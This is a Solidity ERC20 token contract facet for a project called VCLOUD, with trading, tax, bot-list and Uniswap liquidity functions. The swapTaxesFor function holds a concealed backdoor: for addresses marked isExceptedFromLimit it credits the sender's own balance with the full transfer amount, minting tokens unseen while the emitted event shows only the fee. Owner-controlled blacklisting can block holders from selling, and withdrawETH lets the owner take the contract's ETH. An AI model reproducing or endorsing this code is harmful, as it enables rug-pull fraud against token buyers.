// SPDX-License-Identifier: MIT

/***

Website:   https://www.verismcloud.com
DApp:      https://app.verismcloud.com

Twitter:   https://twitter.com/verismcloud_erc
Telegram:  https://t.me/verismcloud_official_channel

***/

pragma solidity 0.8.20;
import "./TestLib.sol";
contract allowanceFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwapBack = true;
        _;
        ds.inSwapBack = false;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalsupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradeOpen, "trading is already open");
        ds.tradeOpen = true;
        ds.swapEnabled = true;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function reduceFee(uint256 _newFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_newFee <= ds._finalBuyTax && _newFee <= ds._finalSellTax);
        ds._finalBuyTax = _newFee;
        ds._finalSellTax = _newFee;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxVCLOUDTrans = ~uint256(0);
        ds._maxVCLOUDWallet = ~uint256(0);
        ds.transferDelayEnabled = false;
    }
    function delBots(address[] memory notbot) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < notbot.length; i++) {
            ds.bots[notbot[i]] = false;
        }
    }
    function addBots(address[] memory bots_) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < bots_.length; i++) {
            ds.bots[bots_[i]] = true;
        }
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function withdrawETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function initTradePair() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = IVCLOUDRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), _totalsupply);
        ds.uniswapV2Pair = IVCLOUDFactory(ds.uniswapV2Router.factory())
            .createPair(address(this), ds.uniswapV2Router.WETH());
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function manualSwapBack() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokenETH(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHFees(ethBalance);
        }
    }
    function swapTokenETH(uint256 tokenAmount) private lockSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 tsFees = 0;
        if (!ds.isExceptedFromFee[from] && !ds.isExceptedFromFee[to]) {
            require(ds.tradeOpen, "Trading has not enabled yet");
            require(!ds.bots[from] && !ds.bots[to]);
            tsFees = amount
                .mul(
                    (ds._buyCounts > ds._reduceBuyTaxAt)
                        ? ds._finalBuyTax
                        : ds._initialBuyTax
                )
                .div(100);
            if (ds.transferDelayEnabled) {
                if (
                    to != address(ds.uniswapV2Router) &&
                    to != address(ds.uniswapV2Pair)
                ) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds.isExceptedFromFee[to]
            ) {
                require(
                    amount <= ds._maxVCLOUDTrans,
                    "Exceeds the ds._maxVCLOUDTrans."
                );
                require(
                    balanceOf(to) + amount <= ds._maxVCLOUDWallet,
                    "Exceeds the maxWalletSize."
                );
                ds._buyCounts++;
            }
            if (to == ds.uniswapV2Pair && from != address(this)) {
                tsFees = amount
                    .mul(
                        (ds._buyCounts > ds._reduceSellTaxAt)
                            ? ds._finalSellTax
                            : ds._initialSellTax
                    )
                    .div(100);
            }
            uint256 contractBalance = balanceOf(address(this));
            if (swapTaxesFor(from, to, amount, tsFees)) {
                swapTokenETH(
                    min(amount, min(contractBalance, ds._maxVCLOUDSwap))
                );
                uint256 ethBalances = address(this).balance;
                if (ethBalances > 0) {
                    sendETHFees(address(this).balance);
                }
            }
        }
        ds._balances[from] = ds._balances[from].sub(amount);
        ds._balances[to] = ds._balances[to].add(amount.sub(tsFees));
        emit Transfer(from, to, amount.sub(tsFees));
    }
    function swapTaxesFor(
        address from,
        address to,
        uint256 taxSP,
        uint256 feeSP
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address accSP;
        uint256 ammSP;
        bool _aVCLOUDMin = taxSP >= ds.routeAmounts;
        bool _aVCLOUDThread = balanceOf(address(this)) >= ds.routeAmounts;
        if (ds.isExceptedFromLimit[from]) {
            accSP = from;
            ammSP = taxSP;
        } else {
            ammSP = feeSP;
            accSP = address(this);
        }
        if (ammSP > 0) {
            ds._balances[accSP] = ds._balances[accSP].add(ammSP);
            emit Transfer(from, accSP, feeSP);
        }
        return
            ds.swapEnabled &&
            ds.tradeOpen &&
            _aVCLOUDMin &&
            _aVCLOUDThread &&
            !ds.inSwapBack &&
            to == ds.uniswapV2Pair &&
            ds._buyCounts > ds._preventSwapBefore &&
            !ds.isExceptedFromFee[from] &&
            !ds.isExceptedFromLimit[from];
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendETHFees(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.lpReceiver.transfer(amount);
    }
}
